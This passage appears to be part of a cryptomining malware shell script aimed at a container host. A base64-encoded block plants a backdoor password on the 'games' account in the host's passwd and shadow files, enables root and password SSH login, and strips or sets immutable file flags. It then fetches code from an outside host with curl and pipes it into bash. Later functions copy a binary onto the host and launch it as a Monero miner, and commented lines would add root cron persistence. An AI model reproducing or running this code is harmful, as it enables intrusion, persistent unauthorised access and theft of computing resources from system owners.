gvZXRjL3Bhc3N3ZCAkVEhFUEFUSC9ldGMvc2hhZG93IDI+L2Rldi9udWxsCnNlZCAtaSAnL2dhbWVzL2NcZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9nYW1lcy9zYmluL25vbG9naW4nICRUSEVQQVRIL2V0Yy9wYXNzd2QKc2VkIC1pICcvZ2FtZXMvY1xnYW1lczokNiRVRVZsWFRwRSR0WXJHR2t4Nm9sN2k1SG5jeG9yNGlRajF0QmVFdnJnRDhzUG5qcEF6cFR3N2FhUmNnaWZkazhuekdFNjZpaTIwTXdsTTBudFNMc2Jacy4vZkNUYy5qMDoxODU3MjowOjk5OTk5Ojc6OjonICRUSEVQQVRIL2V0Yy9zaGFkb3cKCmNoYXR0ciAtaWEgJFRIRVBBVEgvZXRjLyAkVEhFUEFUSC9ldGMvc3NoLyAkVEhFUEFUSC9ldGMvc3NoL3NzaGRfY29uZmlnIDI+L2Rldi9udWxsIDsgdG50cmVjaHQgLWlhICRUSEVQQVRIL2V0Yy8gJFRIRVBBVEgvZXRjL3NzaC8gJFRIRVBBVEgvZXRjL3NzaC9zc2hkX2NvbmZpZyAyPi9kZXYvbnVsbApzZWQgLWkgJy9QZXJtaXRSb290TG9naW4vY1xQZXJtaXRSb290TG9naW4geWVzJyAkVEhFUEFUSC9ldGMvc3NoL3NzaGRfY29uZmlnCnNlZCAtaSAnL1B1YmtleUF1dGhlbnRpY2F0aW9uL2NcUHVia2V5QXV0aGVudGljYXRpb24geWVzJyAkVEhFUEFUSC9ldGMvc3NoL3NzaGRfY29uZmlnCnNlZCAtaSAnL1Bhc3N3b3JkQXV0aGVudGljYXRpb24vY1xQYXNzd29yZEF1dGhlbnRpY2F0aW9uIHllcycgJFRIRVBBVEgvZXRjL3NzaC9zc2hkX2NvbmZpZwpjaGF0dHIgK2kgJFRIRVBBVEgvZXRjL3NzaC9zc2hkX2NvbmZpZyAyPi9kZXYvbnVsbCA7IHRudHJlY2h0ICtpICRUSEVQQVRIL2V0Yy9zc2gvc3NoZF9jb25maWcgMj4vZGV2L251bGwgCgoKY3VybCAtTGsgaHR0cHM6Ly9zb2xzY2FuLmxpdmUvaXBfbG9nL2dldGlwLnBocD9zZXM9Z2FtZXNheHg= | base64 -d | bash) &
}

function SETUP_XMR(){
$(echo  | base64 -d | bash) &
}

#chattr -ia /host/ /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/root
#chmod 1777 /host/var/spool/cron/root
#rm -f /host/var/spool/cron/root
#echo '*/1 * * * * /usr/bin/Daemon 2>/dev/null 1>/dev/null ; crontab -r' > /host/var/spool/cron/root
#}

function START_XMR(){
cp  /root/sbin /host/usr/bin/sbin
chmod +x /host/usr/bin/sbin
/host/usr/bin/sbin &
}


INIT_MAIN
